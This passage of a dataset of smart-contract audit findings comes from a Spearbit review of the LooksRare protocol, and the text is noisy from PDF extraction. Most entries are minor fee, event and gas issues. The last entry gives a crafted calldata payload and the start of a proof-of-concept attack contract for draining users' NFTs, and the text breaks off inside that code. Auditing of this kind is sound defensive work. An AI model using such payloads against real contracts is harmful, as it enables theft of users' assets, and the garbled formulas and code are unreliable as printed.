outcome for y will be ignored/skipped.  [y, x], the call to viewCreatorFeeInfo reverts with BundleEIP2981NotAllowed(collection), since the first item will be skipped and so the initial value for creator will not be set and remains address(0), but when we process the loop for x, we end up comparing a with address(0) which causes the revert.", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "CreatorFeeManagerWithRebates.viewCreatorFeeInfo reversion is dependent on the order of itemIds", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "Assume there is an itemId x where collection.royaltyInfo(x, price) returns (0, _) and an- other itemId y where collection.royaltyInfo(y, price) returns (a, _) where a 6= 0. the itemIds array provided to CreatorFeeManagerWithRebates.viewCreatorFeeInfo is [x, y, the call would revert with the return parameters would be (address(0), 0) and [y, x, ...], Then if ...], BundleEIP2981NotAllowed(collection).", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "Seller might get a lower fee than expected due to front-running", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "This protocol seems to have a fee structure where both the protocol and the original creator of the item are charging fees, and these fees are being subtracted from the seller's fee. This means that the seller, whether they are a maker or a taker, may receive a lower price than they expected due to sudden changes in creator or protocol fee rates.", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "StrategyManager does not emit an event when the first strategy gets added.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "StrategyManager does not emit an event when the first strategy gets added which can cause issues for off-chain agents.", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "TransferSelectorNFT does not emit events when new transfer managers are added in its construc- tor", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "TransferSelectorNFT does not emit an event when assetTypes of 0 and 1 are added in its con- structor.", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "Protocol fees will be sent to address(0) if protocolFeeRecipient is not set.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "Protocol fees will be sent to address(0) if protocolFeeRecipient is not set.", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "The returned price by strategies are not validated", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "When a taker submits an order to be executed, the returned price by the maker's chosen strategy is not validated. The current strategies do have the validations implemented. But the general upper and lower bound price validation would need to be in the protocol contract itself since the price calculation in a potential strategy might be a complex matter that cannot be easily verified by a maker or a taker. Related issue: \"price validation in executeStrategyWithTakerAsk, executeCollectionStrategyWithTakerAsk and ex- ecuteCollectionStrategyWithTakerAskWithProof can be relaxed\"", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "Makers can sign (or be tricked into signing) collection of orders (using the merkle tree mechanism) that cannot be entirely canceled.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "All user-facing order execution endpoints of the protocol check whether the order hash is included in the merkle tree data provided by the caller. If it is, the maker/signer is only required to sign the hash of the tree's root. A maker might sign (or get tricked into signing) a root that belongs to trees with a high number of leaves such that the leaves each encode an order with  Different subsetNonce and orderNonce (this would require canceling each nonce individually if the relevant endpoints are used).  askNonce or bidNonce that form a consecutive array of intergers ( 1, (cid:1) (cid:1) (cid:1) , n ) (this would require incrementing these nonces at least n times, if this method was used as a way of canceling the orders). To cancel these orders, the maker would need to call the cancelOrderNonces, cancelSubsetNonces, or incre- mentBidAskNonces. If the tree has a high number of nodes, it might be infeasible to cancel all the orders due to gas costs. The maker would be forced to remove its token approvals (if it's not a custom EIP-1271 maker/signer) and not use that address again to interact with the protocol.", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "The ItemIdsRange strategy allows for length mismatch in itemIds and amounts", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "There is no validation that takerAsk.itemIds.length == takerAsk.amounts.length in the ItemIdsRange strategy, despite takerAsk.itemIds and takerAsk.amounts being the return values of the executeStrategyWithTakerAsk function. If takerAsk.itemIds.length > takerAsk.amounts.length, then the transaction will revert anyways when it attempts to read an index out of bounds in the main loop. However, there is nothing causing a revert if takerAsk.itemIds.length < takerAsk.amounts.length, and any extra values in the takerAsk.amounts array will be ignored. Most likely this issue would be caught later on in any transaction, e.g. the current TransferManager implementation checks for length mismatches. However, this TransferManager is just one possible implementation that could be added to the TransferSelectorNFT contract, so this still could be an issue.", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "Spec mismatch - StrategyCollectionOffer allows the only single item orders where the spec states it should allow any amount", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "Proof only allow the transfer of a single ERC721/ERC1155 item, although the specification states it should support any amount.", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "Owner of strategies that inherit from BaseStrategyChainlinkMultiplePriceFeeds can add mali- cious price feeds after they have been added to LooksRareProtocol", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "Owner of strategies that inherit from BaseStrategyChainlinkMultiplePriceFeeds can add mali- cious price feeds for new collections after they have been added to LooksRareProtocol. It's also important to note that these strategy owners might not neccessarily be the same owner as the LooksRareProtocol's. 1. LooksRareProtocol's OL adds strategy S. 2. Stragey's owner OS adds a malicous price feed for a new collection T .", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "The price calculation in StrategyDutchAuction can be more accurate", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "StrategyDutchAuction calculates the auction price as uint256 duration = makerAsk.endTime - makerAsk.startTime; uint256 decayPerSecond = (startPrice - makerAsk.minPrice) / duration; uint256 elapsedTime = block.timestamp - makerAsk.startTime; price = startPrice - elapsedTime * decayPerSecond; One of the shortcomings of the above calculation is that division comes before multiplication which can amplify the error due to division.", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "Incorrect isMakerBidValid logic in ItemIdsRange execution strategy", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "If an ItemIdsRange order has makerBid.itemIds[0] == 0, it is treated as invalid by the corre- sponding isMakerBidValid function. Since makerBid.itemIds[0] is the minItemId value, and since many NFT collections contain NFTs with id 0, this is incorrect (and does not match the logic of the ItemIdsRange executeS- trategyWithTakerAsk function). As a consequence, frontends that filter orders based on the isMakerBidValid function will ignore certain orders, even though they are valid.", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "Restructure struct definitions in OrderStructs in a more optimized format", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "Maker and taker ask and bid structs include the fields itemIds and amounts. For most strategies, these two arrays are supposed to have the same length (except for StrategyItemIdsRange). Even for Strate- gyItemIdsRange one can either:  Relax the requirement that makerBid.amounts.length == 1 (be replaced by amounts and itemIds length to be equal to 2 ) by allowing an unused extra amount or  not use the makerBid.amounts and makerBid.itemIds and instead grab those 3 parameters from the addi- tionalParameters field. This might actually make more sense since in the case of StrategyItemIdsRange, the itemIds and amounts carry information that deviates from what they are intended to be used for.", "labels": ["Spearbit", "LooksRare", "Severity: Gas Optimization"]}, {"title": "if/else block in executeMultipleTakerBids can be simplified/optimized", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "if/else block in executeMultipleTakerBids can be simplified/optimized by using the continue keyword and placing the else's body in the outer scope. // If atomic, it uses the executeTakerBid function, if not atomic, it uses a catch/revert pattern with external function ,! if (isAtomic) { // Execute the transaction and add protocol fee totalProtocolFeeAmount += _executeTakerBid(takerBid, makerAsk, msg.sender, orderHash); unchecked { ++i; } continue; } try this.restrictedExecuteTakerBid(takerBid, makerAsk, msg.sender, orderHash) returns ( uint256 protocolFeeAmount ) { totalProtocolFeeAmount += protocolFeeAmount; } catch {} unchecked { ++i; } testThreeTakerBidsERC721OneFails() (gas: -24 (-0.002%)) Overall gas change: -24 (-0.002%) LooksRare: Fixed in PR 323. Spearbit: Verified.", "labels": ["Spearbit", "LooksRare", "Severity: Gas Optimization"]}, {"title": "Cache currency in executeTakerAsk and executeTakerBid", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "currency is read multiple times from calldata in executeTakerAsk and executeTakerBid.", "labels": ["Spearbit", "LooksRare", "Severity: Gas Optimization"]}, {"title": "Cache operators[i] in grantApprovals and revokeApprovals", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "operators[i] is used 3 times in grantApprovals's (and twice in revokeApprovals) for loop.", "labels": ["Spearbit", "LooksRare", "Severity: Gas Optimization"]}, {"title": "recipients[0] is never used", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "recipients[0] is set to protocolFeeRecipient. But its value is never used afterward. payProtocolFeeAndAffiliateFee, the fees[0] amount is manually distributed to an affiliate if any and the pro- tocolFeeRecipient.", "labels": ["Spearbit", "LooksRare", "Severity: Gas Optimization"]}, {"title": "currency validation can be optimized/refactored", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "In the context above we are enforcing only native tokens or WETH to be supplied. The if statement can be simplified and refactored into a utility function (possibly defined in either BaseStrategy or in BaseStrate- gyChainlinkPriceLatency): if (makerAsk.currency != address(0)) { if (makerAsk.currency != WETH) { revert WrongCurrency(); } }", "labels": ["Spearbit", "LooksRare", "Severity: Gas Optimization"]}, {"title": "validating amount can be simplified and possibly refactored", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "In the context above, we are trying to invalidate orders that have 0 amounts or an amount other than 1 when the asset if an ERC721 if (amount != 1) { if (amount == 0) { revert OrderInvalid(); } if (assetType == 0) { revert OrderInvalid(); } } The above snippet can be simplified into: if (amount == 0 or (amount != 1 and assetType == 0)) { revert OrderInvalid(); }", "labels": ["Spearbit", "LooksRare", "Severity: Gas Optimization"]}, {"title": "_verifyMatchingItemIdsAndAmountsAndPrice can be further optimized", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "_verifyMatchingItemIdsAndAmountsAndPrice's validation logic uses more opcodes than is neces- sary. Also, the whole function can be turned into an assembly block to further optimized this function. Examples of simplifications for if conditions or(X, gt(Y, 0)) or(X, Y) // simplified version or(X, iszero(eq(Y,Z))) or(X, xor(Y, Z)) // simplified version The nested if block below if (amount != 1) { if (amount == 0) { revert OrderInvalid(); } if (assetType == 0) { revert OrderInvalid(); } } can be simplified into 33 if (amount == 0) { revert OrderInvalid(); } if ((amount != 1) && (assetType == 0)) { revert OrderInvalid(); }", "labels": ["Spearbit", "LooksRare", "Severity: Gas Optimization"]}, {"title": "In StrategyFloorFromChainlink premium amounts miss the related checks when compared to checks for discount amounts", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "For discount amounts, StrategyFloorFromChainlink has custom checks for the underflows (even though they will be caught by the compiler): 36 if (floorPrice <= discountAmount) { revert DiscountGreaterThanFloorPrice(); } uint256 desiredPrice = floorPrice - discountAmount; ... // @dev Discount cannot be 100% if (discount >= 10_000) { revert OrderInvalid(); } uint256 desiredPrice = (floorPrice * (10_000 - discount)) / 10_000; Similar checks for overflows for the premium are missing in the execution and validation endpoints (even though they will be caught by the compiler, floorPrice + premium or 10_000 + premium might overflow).", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "StrategyFloorFromChainlink's isMakerBidValid compare the time dependent floorPrice to a fixed discount", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "When isMakerBidValid gets called depending on the market conditions at that specific time the comparisons between the floorPrice and the discount might cause this function to either return isValid as true or false.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "StrategyFloorFromChainlink's isMakerAskValid does not validate makerAsk.additionalParameters", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "For executeFixedPremiumStrategyWithTakerBid and executeBasisPointsPremiumStrategy- WithTakerBid, maker needs to make sure to populate its additionalParameters with the premium amount, otherwise the taker's transactions would revert: makerAsk.additionalParameters = abi.encode(premium); isMakerAskValid does not check whether makerAsk.additionalParameters has 32 as its length. For example, the validation endpoint for StrategyCollectionOffer does check this for the merkle root.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "StrategyFloorFromChainlink strategies do not check for asset types explicitly", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "StrategyFloorFromChainlink has 4 different execution endpoints:  executeFixedPremiumStrategyWithTakerBid  executeBasisPointsPremiumStrategyWithTakerBid  executeFixedDiscountCollectionOfferStrategyWithTakerAsk  executeBasisPointsDiscountCollectionOfferStrategyWithTakerAsk All these endpoints require that only one amount to be passed (asked for or bid on) and that amount would need to be 1. This is in contrast to StrategyCollectionOffer strategy that allows an arbitrary amount (although also required to be only one amount, [a]) Currently, Chainlink only provides price feeds for a selected list of ERC721 collections: https://docs.chain.link/ data-feeds/nft-floor-price/addresses So, if there are no price feeds for ERC1155 (as of now), the transaction would revert. Thus implicitly one can deduce that the chainlink floor strategies are only implemented for ERC721 tokens. Other strategies condition the amounts based on the assetType: 38  assetType == 0 or ERC721 collections can only have 1 as a valid amount  assetType == 0 or ERC1155 collections can only have a non-zero number as a valid amount If in the future chainlink or another token-price-feed adds support for some ERC1155 collections, one cannot use the current floor strategies to fulfill an order with an amount greater than 1.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "itemIds and amounts are redundant fields for takerXxx struct", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "Taker is the entity that initiates the calls to LooksRareProtocol's 3 order execution endpoints. Most implemented strategies (which are fixed/chosen by the maker through signing the makerXxx which includes the strategyId) require the itemIds and amounts fields for the maker and the taker to mirror each other. i : the j th element of maker's itemIds fields (the struct would be either MakerBid or MakerAsk depending  M j on the context)  M j a : the j th element of maker's amounts fields (the struct would be either MakerBid or MakerAsk depending on the context)  T j i : the j th element of taker's itemIds fields (the struct would be either TakerBid or TakerAsk depending on the context)  T j a : the j th element of taker's amounts fields (the struct would be either TakerBid or TakerAsk depending on the context) Borrowing notations also from:  \"Constraints among the number of item ids and amounts for taker or maker bids or asks are inconsistent among different strategies\"  IneheritedStategy : T j i = M j  StrategyDutchAuction : T j i , T j i = M j a = M j a i , T j a = M j a , taker can send extra itemIds and amounts but they won't be  StrategyUSDDynamicAsk : T j i = M j i , T j a = M j a , taker can send extra itemIds and amounts but they won't be used. used.  StrategyFloorFromChainlink.execute...PremiumStrategyWithTakerBid : T 0 i = M 0 i , T 0 a = M 0 a = 1 , taker can send extra itemIds and amounts but they won't be used.  StrategyFloorFromChainlink.execute...DiscountCollectionOfferStrategyWithTakerAsk : T 0 a = M 0 a = 1 , maker's itemIds are unused.  StrategyCollectionOffer : T 0 a = M 0 a , maker's itemIds are unused and taker's T i a for i > 0 are also unused.  StrategyItemIdsRange : M 0 i (cid:20) T j i (cid:20) M 1 i , P T j a = M 0 a . 39 For  IneheritedStategy  StrategyDutchAuction  StrategyUSDDynamicAsk  StrategyFloorFromChainlink.execute...PremiumStrategyWithTakerBid Shared taker's itemIds and amounts are redundant as they should exactly match maker's fields. For the other strategies, one can encode the required parameters in either maker's or taker's additionalParameters fields.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "discount == 10_000 is not allowed in executeBasisPointsDiscountCollectionOfferStrategyWith- TakerAsk", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "executeBasisPointsDiscountCollectionOfferStrategyWithTakerAsk reverts if discount == 10_000, but does not if discount == 99_99 which almost has the same effect. Note that if discount == 10_000, (forgetting about the revert) price = desiredPrice = 0. So, unless the taker (sender of the transaction) has set its takerAsk.minPrice to 0 (maker is bidding for a 100% discount and taker is gifting the NFT), the transaction would revert: if (takerAsk.minPrice > price) { // takerAsk.minPrice > 0 revert AskTooHigh(); }", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "Restructure executeMultipleTakerBids's input parameters", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "executeMultipleTakerBids has the following form function executeMultipleTakerBids( OrderStructs.TakerBid[] calldata takerBids, OrderStructs.MakerAsk[] calldata makerAsks, bytes[] calldata makerSignatures, OrderStructs.MerkleTree[] calldata merkleTrees, address affiliate, bool isAtomic ) For the input parameters provided, we need to make sure takerBids, makerAsks, makerSignatures, and merkle- Trees all have the same length. We can enforce this requirement by definition, if we restructure the input passed to executeMultipleTakerBids.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "Restructure transferBatchItemsAcrossCollections input parameter format", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "transferBatchItemsAcrossCollections has the following form function transferBatchItemsAcrossCollections( address[] calldata collections, uint256[] calldata assetTypes, address from, address to, uint256[][] calldata itemIds, uint256[][] calldata amounts ) where collections, assetTypes, itemIds and amounts are supposed to have the same lengths. One can enforce that by redefining the input parameter and have this invariant enforced by definition.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "An approved operator can call transferBatchItemsAcrossCollections", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "TransferManager has 3 endpoints that an approved operator can call:  transferItemsERC721  transferItemsERC1155  transferBatchItemsAcrossCollections The first 2 share the same input parameter types but differ from transferBatchItemsAcrossCollections: , address transferItemsERC1155 address ,! address[], address[], address, address , uint256[][], uint256[][] // ,! transferBatchItemsAcrossCollections , address, uint256[], uint256[] // transferItemsERC721, 44 An operator like LooksRareProtocol might have an owner ( OL ) that can select/add arbitrary endpoint of this transfer manager for an asset type, but only call the transfer manager using the same input parameter types regardless of the added endpoint. So in this case, OL might add a new asset type with TransferManager.transferBatchItemsAcrossCollections.selector as the selector and this transfer manager as the manager. Now, since this operator/LooksRareProtocol (and possibly other future implementations of approved operators) uses the same list of parameters for all endpoints, when _transferNFT gets called, the transfer manager using the transferBatchItemsAcrossCollections endpoint but with the following encoded data: the protocol would call abi.encodeWithSelector( managerSelectorOfAssetType[assetType].selector, collection, sender, recipient, itemIds, amounts ) ) A crafty OL might try to take advantage of the parameter type mismatch to create a malicious payload (address, address, address, uint256[], uint256[] ) that when decoded as (address[], address[], address, address, uint256[][], uint256[][]) It would allow them to transfer any NFT tokens from any user to some specific users. ; interpreted paramters | original parameter ,! ; ---------------------------------- ,! -------- c Ma.s or msg.sender 00000000000000000000000000000000000000000000000000000000000000c0 ; collections.ptr 0000000000000000000000000000000000000000000000000000000000000100 ; assetTypes.ptr ,! 00000000000000000000000000000000000000000000000000000000000000X3 ; from ,! 00000000000000000000000000000000000000000000000000000000000000X4 ; to ,! itemIds.ptr -> 0xa0 Tb.r or Mb.s x 0000000000000000000000000000000000000000000000000000000000000140 ; itemIds.ptr ,! amounts.ptr -> 0xc0 + 0x20 * itemIds.length 00000000000000000000000000000000000000000000000000000000000001c0 ; amounts.ptr ,! itemIds.length | collection | from / | to / | | | ; ; | itemIds[0] | itemIds[1] ... Fortunately, that is not possible since in this particular instance the transferItemsERC721 and transferItem- sERC1155's amounts's calldata tail pointer always coincide with transferBatchItemsAcrossCollections's itemIds's calldata tail pointer (uint256[] amounts, uint256[][] itemIds) which unless both have length 0 it would cause the compiled code to revert due to out of range index access. This is also dependent on if/how the compiler encodes/decodes the calldata and if the compiler would add the bytecodes for the deployed code to revert for OOR accesses (which solc does). This is just a lucky coincidence otherwise, OT could have exploited this flaw.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "Shared login in different StrategyFloorFromChainlink strategies can be refactored", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": " executeFixedPremiumStrategyWithTakerBid and executeBasisPointsPremiumStrategyWithTakerBid.  executeFixedDiscountCollectionOfferStrategyWithTakerAsk and executeBasisPointsDiscountCol- lectionOfferStrategyWithTakerAsk. Each group of endpoints in the above list share the exact same logic. The only difference they have is the formula and checks used to calculate the desiredPrice based on a given floorPrice and premium/discount. function a1(<INPUT_PARAMS>) external view returns (<OUTPUT_PARAMS>) { <PRE_COMMON_BLOCK> (<OUTER_PARAMS>) = _a1(<INTER_PARAMS>); // inlined computation of _a1 <POST_COMMON_BLOCK> } function a2(<INPUT_PARAMS>) external view returns (<OUTPUT_PARAMS>) { <PRE_COMMON_BLOCK> (<OUTER_PARAMS>) = _a2(<INTER_PARAMS>); // inlined computation of _a2 <POST_COMMON_BLOCK> }", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "Setting protocol and ask fee amounts and recipients can be refactored in ExecutionManager", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "Setting and calculating the protocol and ask fee amounts and recipients follow the same logic in _executeStrategyForTakerAsk and _executeStrategyForTakerBid.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "Creator fee amount and recipient calculation can be refactored in ExecutionManager", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "The create fee amount and recipient calculation in _executeStrategyForTakerAsk and _executeS- trategyForTakerBid are identical and can be refactored.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "The owner can set the selector for a strategy to any bytes4 value", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "The owner can set the selector for a strategy to any bytes4 value (as long as it's not bytes4(0)). Even though the following check exists if (!IBaseStrategy(implementation).isLooksRareV2Strategy()) { revert NotV2Strategy(); } There is no measure taken to avoid potential selector collision with other contract types.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "Constraints among the number of item ids and amounts for taker or maker bids or asks are incon- sistent among different strategies.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "Constraints among the number of item ids and amounts for taker or maker bids or asks are incon- sistent among different strategies. notation description Ti Ta Mi Ma length of taker's bid (or ask depending on the context) item ids length of taker's bid (or ask depending on the context) amounts length of maker's bid (or ask depending on the context) item ids length of maker's bid (or ask depending on the context) amounts 59  IneheritedStategy : Ti = Ta = Mi = Ma  StrategyItemIdsRange : Ti (cid:20) Ta, Mi = 2, Ma = 1 (related issue)  StrategyDutchAuction : Mi (cid:20) Ti , Ma (cid:20) Ta, Mi = Ma  StrategyUSDDynamicAsk: Mi (cid:20) Ti , Ma (cid:20) Ta, Mi = Ma  StrategyFloorFromChainlink.execute...PremiumStrategyWithTakerBid : Mi (cid:20) Ti , Ma (cid:20) Ta, Mi = Ma = 1  StrategyFloorFromChainlink.execute...DiscountCollectionOfferStrategyWithTakerAsk : Ti = 1, 1 = Ta, Ma = 1  StrategyCollectionOffer : Ti = 1, 1 (cid:20) Ta, Ma = 1 The equalities above are explicitly enforced, but the inequalities are implicitly enforced through the compiler's out-of-bound revert. Note that in most cases (except StrategyItemIdsRange) one can enforce Ti = Ta = Mi = Ma and refactor this logic into a utility function.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "Requirements/checks for adding new transfer managers (or strategies) are really important to avoid self-reentrancy through restrictedExecuteTakerBid from unexpected call sites", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "When a new transfer manager gets added to the protocol, there is a check to make sure that this manager cannot be the protocol itself. This is really important as restrictedExecuteTakerBid allows the protocol itself to call this endpoint. If the check below was omitted: if ( transferManagerForAssetType == address(0) || // transferManagerForAssetType == address(this) || selectorForAssetType == bytes4(0) ) { } revert ManagerSelectorEmpty(); The owner can add the protocol itself as a transfer manager for a new asset type and pick the selector to be ILooksRareProtocol.restrictedExecuteTakerBid.selector. Then the owner along with a special address can collude and drain users' NFT tokens from an actual approved transfer manager for ERC721/ERC1155 assets. The special feature of restrictedExecuteTakerBid is that once it's called the provided parameters by the maker are not checked/verified against any signatures. The PoC below includes 2 different custom strategies for an easier setup but they are not necessary (one can use the default strategy). One creates the calldata payload and the other is called later on to select a desired NFT token id. 60 The calldata to restrictedExecuteTakerBid(...) is crafted so that the corresponding desired parameters for an actual transferManager.call can be set by itemIds; parameters offset ,! ------------------------------------------------------------------------------------------------------- c ,! 0x0000 interpreted parameters ---------- | original msg.sender, , can be changed by stuffing 0s 0000000000000000000000000000000000000000000000000000000000000080 0000000000000000000000000000000000000000000000000000000000000180 ,! 00000000000000000000000000000000000000000000000000000000000000X1 ; sender ,! 00000000000000000000000000000000000000000000000000000000000000a0 ,! msg.sender / signer ho, orderHash, 0xa0 | collection | signer / | Ta.r or | i[] ptr 0x0080 ,! to, can be changed by stuffing 0s 00000000000000000000000000000000000000000000000000000000000000X2 ; Tb.r | a[] ptr , 0x0180 00000000000000000000000000000000000000000000000000000000000000X3 ; Tb.p_max 00000000000000000000000000000000000000000000000000000000000000a0 00000000000000000000000000000000000000000000000000000000000000c0 00000000000000000000000000000000000000000000000000000000000000e0 0000000000000000000000000000000000000000000000000000000000000000 0000000000000000000000000000000000000000000000000000000000000000 0000000000000000000000000000000000000000000000000000000000000000 from 0000000000000000000000000000000000000000000000000000000000000000 0000000000000000000000000000000000000000000000000000000000000000 00000000000000000000000000000000000000000000000000000000000000X4 ; sid 00000000000000000000000000000000000000000000000000000000000000X5 ; t 0000000000000000000000000000000000000000000000000000000000000000 00000000000000000000000000000000000000000000000000000000000000X6 ; T 00000000000000000000000000000000000000000000000000000000000000X7 ; C 00000000000000000000000000000000000000000000000000000000000000X8 ; signer ,! 00000000000000000000000000000000000000000000000000000000000000X9 ; ts 00000000000000000000000000000000000000000000000000000000000000Xa ; te 0000000000000000000000000000000000000000000000000000000000000000 00000000000000000000000000000000000000000000000000000000000001c0 00000000000000000000000000000000000000000000000000000000000001e0 0000000000000000000000000000000000000000000000000000000000000200 0000000000000000000000000000000000000000000000000000000000000000 0000000000000000000000000000000000000000000000000000000000000000 0000000000000000000000000000000000000000000000000000000000000000 | i[].len | i[0] | i[1] | i[2] | i[3] | i[4] | i[5] | i[6] | i[7] | i[8] | i[9] | i[10] | i[11] | i[12] | i[13] , | i[14] | i[15] | i[16] | i[17] | i[18] | i[19] | i[20] | i[21] | i[22] ; T = real_collection ; C = currency ; t = assetType ; sid = strategyId ; ts = startTime ; te = endTime ; Ta = takerAsk ; Tb = takerBid // file: test/foundry/AssetAttack.t.sol pragma solidity 0.8.17; import {IStrategyManager} from \"../../contracts/interfaces/IStrategyManager.sol\"; import {IBaseStrategy} from \"../../contracts/interfaces/IBaseStrategy.sol\"; import {OrderStructs} from \"../../contracts/libraries/OrderStructs.sol\"; import {ProtocolBase} from \"./ProtocolBase.t.sol\"; import {MockERC20} from \"../mock/MockERC20.sol\"; 61 interface IERC1271 { function isValidSignature( bytes32 digest, bytes calldata signature ) external returns (bytes4 magicValue); } contract PayloadStrategy is IBaseStrategy { address private owner; address private collection; address private currency; uint256 private assetType; address private signer; uint256 private nextStartegyId; constructor() { owner = msg.sender; } function set( address _collection, address _currency, uint256 _assetType, address _signer, uint256 _nextStartegyId ) external { if(msg.sender != owner) revert(); collection = _collection; currency = _currency; assetType = _assetType; signer = _signer; nextStartegyId = _nextStartegyId; } function isLooksRareV2Strategy() external pure override returns (bool) { return true; } function execute( OrderStructs.TakerBid calldata /* takerBid */ , OrderStructs.MakerAsk calldata /* makerAsk */ ) external view returns ( uint256 price, uint256[] memory itemIds, uint256[] memory amounts, bool isNonceInvalidated ) { itemIds = new uint256[](23); itemIds[0] = 0xa0; itemIds[1] = 0xc0; itemIds[2] = 0xe0; 62 itemIds[8] = nextStartegyId; itemIds[9] = assetType; itemIds[11] = uint256(uint160(collection)); itemIds[12] = uint256(uint160(currency)); itemIds[13] = uint256(uint160(signer)); itemIds[14] = 0; // startTime itemIds[15] = type(uint256).max; // endTime itemIds[17] = 0x01c0; itemIds[18] = 0x01e0; itemIds[19] = 0x0200; } } contract ItemSelectorStrategy is IBaseStrategy { address private owner; uint256 private itemId; uint256 private amount; constructor() { owner = msg.sender; } function set( uint256 _itemId, uint256 _amount ) external { if(msg.sender != owner) revert(); itemId = _itemId; amount = _amount; } function isLooksRareV2Strategy() external pure override returns (bool) { return true; } function execute( OrderStructs.TakerBid calldata /* takerBid */ , OrderStructs.MakerAsk calldata /* makerAsk */ external view returns ( uint256 price, uint256[] memory itemIds, uint256[] memory amounts, bool isNonceInvalidated ) itemIds = new uint256[](1); itemIds[0] = itemId; amounts = new uint256[](1); amounts[0] = amount; ) { } } contract AttackTest is ProtocolBase { PayloadStrategy private payloadStrategy; 63 ItemSelectorStrategy private itemSelectorStrategy; MockERC20 private mockERC20; // // can be an arbitrary address uint256 